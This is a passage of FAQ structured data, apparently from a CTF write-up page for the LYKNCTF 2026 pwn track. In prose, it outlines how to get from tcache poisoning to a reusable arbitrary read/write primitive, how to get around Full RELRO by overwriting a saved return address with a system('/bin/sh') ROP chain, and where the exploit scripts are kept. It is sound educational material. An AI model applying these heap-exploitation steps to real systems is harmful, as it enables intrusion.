    {"@type": "Question","name": "How does H34P D3V1L go from tcache poisoning to reusable arbitrary read/write?","acceptedAnswer": {"@type": "Answer","text": "Tcache-poison an allocation onto the global notes array. Write fake table: notes[0] = {in_use=1, size=0x1e0, data=&notes[0]} (self-pointing); notes[1] = {in_use=1, size=controlled, data=controlled}. edit(0) rewrites the fake table (retarget notes[1]->data); view(1) reads from notes[1]->data; edit(1) writes to notes[1]->data. Self-pointer makes it reusable."}},
    {"@type": "Question","name": "Why overwrite a saved return address instead of __free_hook or GOT?","acceptedAnswer": {"@type": "Answer","text": "Full RELRO maps GOT read-only. __free_hook and __malloc_hook still exist as compatibility symbols in glibc 2.39 but are not consulted by the allocator any more (removed as active control-flow targets in 2.34). Stack is writable; dump upper stack via arbitrary R/W, find saved return addresses into PIE .text, overwrite with system('/bin/sh') ROP chain."}},
    {"@type": "Question","name": "What's the broader lesson from the LYKNCTF 2026 pwn track?","acceptedAnswer": {"@type": "Answer","text": "Three challenges climb a well-designed curve: miss sizeof(buf) and lose to ret2win; accept a signed length and lose to byte truncation; let two index-check drifts compose into a full off-by-one UAF that unwinds through every layer of modern glibc heap defence. Mitigations rarely fail in isolation; they compose or fail to compose against layered attacks. Full RELRO alone doesn't stop H34P D3V1L; stack canary would."}},
    {"@type": "Question","name": "Where can I find the exploit scripts?","acceptedAnswer": {"@type": "Answer","text": "github.com/Abdelkad3r/LYKNCTF. Each pwn challenge has a solve.sh wrapper and an exploit.py that reproduces the flag against a fresh remote instance. All three exploits use only the Python standard library (no pwntools). H34P D3V1L retries on a fresh layout if an fgets-based write contains a newline byte in the encoded pointer."}}
  ]
}
</script>
